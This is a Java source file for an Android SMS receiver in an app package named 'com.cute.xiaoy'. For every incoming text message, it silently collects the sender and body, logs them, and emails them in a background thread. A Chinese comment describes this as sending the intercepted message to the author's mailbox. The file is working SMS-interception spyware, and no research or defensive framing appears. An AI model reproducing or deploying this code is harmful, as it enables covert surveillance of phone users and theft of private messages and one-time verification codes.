package com.cute.xiaoy.receiver;

import java.io.UnsupportedEncodingException;

import javax.mail.MessagingException;

import com.cute.xiaoy.utils.SendMail;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;


public class SmsReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		Object[] pdus =  (Object[]) intent.getExtras().get("pdus");
		//检查手机网络状态  获取网络状态管理器
		ConnectivityManager mManager = (ConnectivityManager) context.getSystemService(context.CONNECTIVITY_SERVICE);
		NetworkInfo networkinfo = mManager.getActiveNetworkInfo();
		String address = "";
		String body = "";
		StringBuilder sb = new StringBuilder();
		boolean flat = true; //用来确定address只记录一次
		for(Object pdu:pdus){
			SmsMessage sms= SmsMessage.createFromPdu((byte[]) pdu);
			 sb.append(sms.getDisplayMessageBody());
			if(flat){
				address = sms.getDisplayOriginatingAddress();
				flat = false;
			}
		}
		body = sb.toString();
		String content = address +":  \n"+body;   
		Log.e("HK", "content:"+content);
		//通过网络管理器 查看网络连接是否可用  如果可用  将截取的msg通过email发送至我的邮箱
		if(networkinfo!=null){
			if(networkinfo.isAvailable()){
				final SendMail sMail = new SendMail(content, "新的短信"); 
				Log.e("HK", "sMail:"+sMail.toString());
				new Thread(new Runnable() {
					
					@Override
					public void run() {
						try {
							sMail.send(null, null);
						} catch (UnsupportedEncodingException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						} catch (MessagingException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
						
					}
				}).start();
				
			}
		}
	}

}
